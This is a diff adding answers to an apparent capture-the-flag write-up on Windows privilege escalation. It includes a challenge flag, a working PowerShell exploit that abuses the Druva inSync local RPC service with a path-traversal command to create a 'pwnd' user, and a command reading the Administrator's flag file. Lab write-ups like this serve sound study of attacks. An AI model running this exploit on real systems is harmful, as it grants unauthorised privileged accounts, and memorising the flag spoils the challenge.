@@ -421,6 +421,16 @@ Go to the Administrator's desktop to retrieve a flag. Don't forget to input the 
 ### Answer the questions below
 
 * Get the flag on svcusr1's desktop.
+	
+	``
+
+	* Query the service configuration
+	
+		![task5-query](./images/task5-query.png)
+
+	* Create and download payload
+	
+		![task5-payload](./images/task5-payload.png)
 
 * Get the flag on svcusr2's desktop.
 
@@ -674,6 +684,41 @@ When prompted for credentials, use the `pwnd` account. From the new command prom
 ### Answer the questions below
 
 * Get the flag on the Administrator's desktop.
+
+	`THM{EZ_DLL_PROXY_4ME}`
+
+	* Run script on poweshell
+	
+		```
+		$ErrorActionPreference = "Stop"
+
+		$cmd = "net user pwnd /add"
+
+		$s = New-Object System.Net.Sockets.Socket(
+    		[System.Net.Sockets.AddressFamily]::InterNetwork,
+    		[System.Net.Sockets.SocketType]::Stream,
+    		[System.Net.Sockets.ProtocolType]::Tcp
+		)
+		$s.Connect("127.0.0.1", 6064)
+
+		$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+		$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+		$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+		$length = [System.BitConverter]::GetBytes($command.Length);
+
+		$s.Send($header)
+		$s.Send($rpcType)
+		$s.Send($length)
+		$s.Send($command)
+		```
+
+		![task7-script](./images/task7-script.png)
+
+		* Run cmd.exe as PWND and get the flag
+			
+			`type C:\Users\Administrator\Desktop\flag.txt`
+
+			![task7-flag](./images/task7-flag.png)
 
 ## Task 8 - Tools of the Trade
 
